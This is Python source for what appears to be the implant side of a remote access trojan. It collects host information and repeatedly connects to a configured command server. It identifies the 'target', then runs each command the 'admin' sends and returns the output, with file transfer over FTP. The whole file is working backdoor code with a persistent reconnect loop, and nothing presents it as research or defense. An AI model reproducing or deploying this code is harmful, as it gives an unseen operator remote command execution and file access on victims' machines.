from socket import socket,SOL_SOCKET,SO_REUSEADDR
import platform, logging
from base64 import encodestring
from time import sleep

# my modules
import core.settings as settings
import core.utils as utils
import core.sock_utils as sock_utils
from core.ftp import Ftp

if __name__ == '__main__' :
    
    logging.basicConfig(level=logging.DEBUG)
    logger = logging.getLogger(__name__)
    
    target_dev_info = utils.get_machine_info()
    target_dev_info["id"] = settings.ID
    
    while 1:
        try :
            logger.info("[->] Connecting to {}:{}".format(settings.SOCK_SRV, settings.SOCK_PORT))

            admin = socket()
            admin.connect((settings.SOCK_SRV, settings.SOCK_PORT))
            
            logger.info("[+] Successfully connected ")

            # identifying the target
            tmp_msg = "__ack__id__" + target_dev_info["id"]
            admin.send( tmp_msg.encode() )
            ack = admin.recv(settings.SOCK_BF)
            ack = ack.decode("utf8")
            
            if not ack :
                continue
            elif ack == "__ko__":
                #send all info
                admin.send( "__info__".encode() + str(target_dev_info).replace("'",'"').encode() )

            elif ack == "__ok__":
                logger.info("Done identifying")
            # Done identifying
            
            # start ftp client
            ftp_client = Ftp(settings.SOCK_SRV, settings.FTP_PORT)

            while 1:
        
                cmd = admin.recv(settings.SOCK_BF)
                cmd = cmd.decode("utf8")
                logger.info("received cmd : " + cmd)

                if  not cmd :
                    logger.info("Admin closed connection")
                    break

                elif cmd == "_ok_tSize_":
                    # server got file size
                    ftp_client.send_async()
                    continue

                # executing received cmd
                res = sock_utils.execute_cmd(cmd, ftp_client)
                if res == "" :continue
                # send cmd execution result to admin
                admin.send(res.encode())

            # closing connection
            admin.close()

        except Exception as e :
            logger.info("Exception : {} ".format(str(e)))
            sleep(2)
            